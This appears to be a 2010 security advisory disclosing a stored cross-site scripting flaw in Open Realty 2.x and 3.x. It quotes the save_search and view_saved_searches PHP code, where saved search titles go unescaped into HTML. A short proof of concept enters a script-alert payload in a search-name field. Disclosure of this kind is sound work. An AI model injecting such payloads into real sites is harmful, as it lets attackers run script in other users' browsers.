@@ -1,0 +1,59 @@
+# Title: persistence XSS flaw in Open Realty 2.x and 3.x
+# Author: K053  <K053.dev0te3 at gmail>
+# Date: 2010-7-24
+# Hompage: http://open-realty.org
+# Download Link: http://www.open-realty.org/download.html
+# Version: 3.x & 2.x < seems all version >
+======================================================================================================
+Detail :
+========
+
+	function save_search(){
+	   ...
+	   ...
+	   
+	   // $title contain user supplied serach result name which save in DB without any input validation
+	   
+	   if ($num_columns == 0) {
+			$sql = "INSERT INTO " . $config['table_prefix'] . "usersavedsearches 
+			(userdb_id, usersavedsearches_title, usersavedsearches_query_string,
+			usersavedsearches_last_viewed,usersavedsearches_new_listings,usersavedsearches_notify)
+			VALUES ($userID, $title, $query,now(),0, $notify)";
+	   ...
+	   ...
+	}
+	function view_saved_searches()
+	{
+       ...  
+	   ...
+	   else {   
+	          		while (!$recordSet->EOF) {
+					$title = $misc->make_db_unsafe($recordSet->fields['usersavedsearches_title']);
+					if ($title == '') {
+						$title = $lang['saved_search'];
+					}
+					$display .= '<a href="index.php?action=searchresults&' . $misc->make_db_unsafe
+					($recordSet->fields['usersavedsearches_query_string']) . '">' . $title . '</a> 
+					   <div class="note"><a href="index.php?action=delete_search&
+					searchID=' . $misc->make_db_unsafe($recordSet->fields['usersavedsearches_id']) . '" 
+					onclick="return confirmDelete()">' . $lang['delete_search'] . '</a></div><br /><br />';
+
+					$recordSet->MoveNext();
+				}
+			}
+		}else {
+			$display = $status;
+		}
+		
+		// and no output validation, $display passed immediately 
+		
+		return $display;
+======================================================================================================
+POC :
+=====
+load http://address/index.php?action=save_search   < note some parameter set by passed url >
+in textbox enter <script>alert(0)</scritp>.
+
+load http://address/index.php?action=view_saved_searches  to view result
+______________________________________________________________________________________________________
+~Blackout Frenzy [http://b0f.ir]
